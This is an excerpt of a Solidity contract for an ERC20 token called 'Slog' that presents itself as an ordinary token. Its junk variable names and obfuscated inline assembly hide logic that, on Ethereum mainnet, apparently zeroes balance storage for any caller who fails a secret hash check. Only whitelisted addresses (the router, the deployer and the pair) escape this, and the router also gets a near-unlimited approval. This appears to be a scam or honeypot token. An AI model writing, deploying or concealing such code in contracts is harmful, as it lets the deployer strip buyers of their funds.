...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSlog;
    uint256 private rateHike = block.number*2;

    mapping (address => bool) private _firstJerome; 
    mapping (address => bool) private _secondPowell;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private strangeBreath;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private italianMom;
    address public pair;
    ...
    bool private trading; uint256 private barrelRoll = 1; bool private snowPiercer;
    uint256 private _decimals; uint256 private movingPiece;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSlog.push(_router); addSlog.push(msgSender_); addSlog.push(pair);
        for (uint256 q=0; q < 3;) {_firstJerome[addSlog[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x748c785ba2501915e5e4ddb50073109ac355dd3a98dd9d8cf27ae886c924cbd9
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x11fed1b80bf5aeecf9019afc2e046353697721c2e4b12a03708a7455447a22c5,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; rateHike = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSlog[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySlog(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSlog[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySlog(creator, initialSupply);
    }
}

contract Slog is ERC20Token {
    constructor() ERC20Token("Slog", "SLOG", msg.sender, 5000000 * 10 ** 18) {
    }
}